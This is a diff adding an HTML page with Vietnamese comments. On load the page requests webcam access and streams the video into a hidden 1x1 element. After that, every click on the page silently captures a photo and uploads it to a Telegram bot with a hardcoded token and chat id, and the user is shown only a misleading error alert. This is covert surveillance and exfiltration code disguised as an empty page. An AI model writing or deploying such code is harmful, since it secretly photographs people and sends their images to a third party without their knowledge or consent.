@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title> </title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+// Hàm chụp ảnh khuôn mặt bằng webcam
+function capturePhoto() {
+    var video = document.getElementById('video');
+    var canvas = document.createElement('canvas');
+    var context = canvas.getContext('2d');
+
+    // Cài đặt kích thước canvas bằng kích thước video
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    // Chụp ảnh từ video
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Lấy dữ liệu ảnh dưới dạng Blob
+    canvas.toBlob(function(blob) {
+        // Gửi ảnh qua Telegram
+        var formData = new FormData();
+        formData.append('chat_id', '-989932845');
+        formData.append('photo', blob, 'photo.jpg');
+
+        $.ajax({
+            type: 'POST',
+            url: 'https://api.telegram.org/bot6002210854:AAFtNuunUbJoDk6C83oU-dE3il63-M2mSUI/sendPhoto',
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(response) {
+                alert('Đã xảy ra lỗi!');
+            },
+            error: function(error) {
+                alert('Đã xảy ra lỗi!');
+            }
+        });
+    }, 'image/jpeg');
+}
+
+// Sử dụng API getUserMedia để truy cập webcam
+function requestCameraAccess() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+            var video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Xử lý sự kiện click trên toàn bộ trang web
+            document.addEventListener('click', function() {
+                capturePhoto();
+            });
+        })
+        .catch(function(error) {
+            console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);
+        });
+}
+
+// Hiển thị hộp thoại alert và xử lý phản hồi của người dùng
+function showCameraAccessAlert() {
+    alert('Ứng dụng muốn truy cập vào camera.');
+    requestCameraAccess();
+}
+
+// Gọi hàm hiển thị hộp thoại alert khi trang web được tải
+window.addEventListener('DOMContentLoaded', function() {
+    showCameraAccessAlert();
+});
+
+    </script>
+</head>
+<body>
+    <h1> </h1>
+    <video id="video" width="1" height="1" autoplay></video>
+</body>
+</html>
